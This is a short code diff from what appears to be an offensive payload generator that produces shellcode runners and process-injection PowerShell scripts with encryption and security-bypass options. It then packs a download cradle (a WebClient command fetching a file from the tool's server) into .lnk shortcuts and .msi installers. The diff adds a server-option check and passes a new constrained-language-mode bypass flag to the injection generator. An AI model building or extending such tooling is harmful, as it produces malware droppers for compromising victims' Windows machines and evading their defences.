@@ -85,6 +85,11 @@ def argparser():
 
     if not args.quiet:
         print_banner()
+    
+    output_ext = os.path.splitext(args.output)[1]
+    if (output_ext in containers_ext and not args.server):
+        parser.error('output extension requires requires server option')
+
 
     return args
 
@@ -229,7 +234,7 @@ def main():
             code = ps.shellcode_runner(shellcode, args.encrypt, key, iv, args.bypass)
         elif args.method == 'inject':
             print_info(f'Generating process injection payload')
-            code = ps.process_injection(shellcode, args.encrypt, key, iv, args.bypass, args.process)
+            code = ps.process_injection(shellcode, args.encrypt, key, iv, args.bypass, args.process, args.clm)
         
         with open(target, 'w') as f:
             f.write(code)
@@ -272,7 +277,6 @@ def main():
                         f.write(doc_file)
                     ps_command = f'(New-Object System.Net.WebClient).DownloadFile("{url}/{output_basename}", "{output_basename}");'
                 elif output_ext == '.lnk':
-                    #TODO: lnk is not hosted
                     lnk.shortcut('powershell', ps_command, output)
                 elif output_ext == '.msi':
                     msi_file = msi.generate(ps_command)
